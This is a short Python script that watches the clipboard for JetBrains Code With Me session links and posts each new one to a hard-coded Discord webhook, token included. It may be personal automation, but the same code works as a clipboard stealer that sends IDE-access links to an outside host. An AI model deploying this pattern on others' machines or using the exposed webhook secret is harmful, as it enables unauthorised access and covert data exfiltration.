from time import sleep

import requests
import pyperclip

last = ""

WEBHOOK_URL = "https://discord.com/api/webhooks/1337899591043125249/s956kQRJW9WBeBLcxsYFpHrNaKpHxaTerW6_dgkR57VgLn2CM7lQsqaqASD0f-iqCJhw"

while True:
    variable = pyperclip.paste()

    ok = variable.startswith("https://code-with-me.global.jetbrains.com/")
    if ok:
        if last != variable:
            last = variable

            data = {
                "content": variable,
                "name": "l29y6n8x"
            }

            response = requests.post(WEBHOOK_URL, json=data)

            if response.status_code == 204:
                print("✅ Nachricht erfolgreich gesendet!")
            else:
                print(f"❌ Fehler: {response.status_code}, {response.text}")
    sleep(0.5)